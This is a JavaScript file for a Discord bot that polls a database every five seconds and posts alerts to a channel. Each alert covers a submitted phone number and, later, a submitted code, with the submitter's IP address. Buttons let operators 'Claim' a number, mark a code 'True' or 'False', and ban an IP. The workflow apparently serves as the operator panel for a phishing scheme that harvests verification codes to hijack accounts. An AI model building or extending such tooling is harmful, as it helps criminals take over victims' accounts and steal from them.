import { CONFIG } from "./config.js";
import { getPendingRequests, getCodeSubmittedRequests } from "./database.js";
import { buildNewRequestEmbed, buildCodeSubmittedEmbed } from "./utils/embedBuilder.js";
import { ButtonBuilder, ButtonStyle, ActionRowBuilder } from "discord.js";
import { claimedBy } from "./handlers/buttons.js";

let lastPendingId = 0;
let lastCodeSubmittedId = 0;

function createBanIPButton(ip) {
    if (!ip || ip === "unknown" || ip === "null" || !ip.includes(".")) return null;
    return new ButtonBuilder()
        .setCustomId("banip_" + ip)
        .setLabel("🚫 Ban IP")
        .setStyle(ButtonStyle.Danger);
}

export function startPolling(client) {
    // Polling: new pending requests
    setInterval(async () => {
        try {
            const rows = await getPendingRequests(lastPendingId);
            for (const row of rows) {
                lastPendingId = Math.max(lastPendingId, row.id);
                await sendNewRequest(client, row);
            }
        } catch (e) {
            console.error("Pending polling error:", e.message || e);
        }
    }, 5000);

    // Polling: code submitted requests
    setInterval(async () => {
        try {
            const rows = await getCodeSubmittedRequests(lastCodeSubmittedId);
            for (const row of rows) {
                lastCodeSubmittedId = Math.max(lastCodeSubmittedId, row.id);
                await sendCodeSubmitted(client, row);
            }
        } catch (e) {
            console.error("CodeSubmitted polling error:", e.message || e);
        }
    }, 5000);
}

async function sendNewRequest(client, row) {
    const channel = client.channels.cache.get(CONFIG.LOG_CHANNEL_ID);
    if (!channel) { console.log("⚠️ Log channel not found"); return; }

    const embed = buildNewRequestEmbed(row);
    const buttons = [
        new ButtonBuilder().setCustomId("claim_" + row.phone).setLabel("📋 Claim").setStyle(ButtonStyle.Primary)
    ];
    const banBtn = createBanIPButton(row.ip_address);
    if (banBtn) buttons.push(banBtn);

    await channel.send({ content: "@everyone", embeds: [embed], components: [new ActionRowBuilder().addComponents(...buttons)] });
    console.log("📨 New request: " + row.phone);
}

async function sendCodeSubmitted(client, row) {
    const channel = client.channels.cache.get(CONFIG.LOG_CHANNEL_ID);
    if (!channel) return;

    const embed = buildCodeSubmittedEmbed(row);
    const buttons = [
        new ButtonBuilder().setCustomId("truecode_" + row.phone).setLabel("✅ True Code").setStyle(ButtonStyle.Success),
        new ButtonBuilder().setCustomId("falsecode_" + row.phone).setLabel("❌ False Code").setStyle(ButtonStyle.Danger)
    ];
    const banBtn = createBanIPButton(row.ip_address);
    if (banBtn) buttons.push(banBtn);

    const claimer = claimedBy.get(row.phone);
    await channel.send({ 
        content: claimer ? "<@" + claimer + ">" : undefined, 
        embeds: [embed], 
        components: [new ActionRowBuilder().addComponents(...buttons)] 
    });
    console.log("🔓 Code submitted: " + row.phone);
}
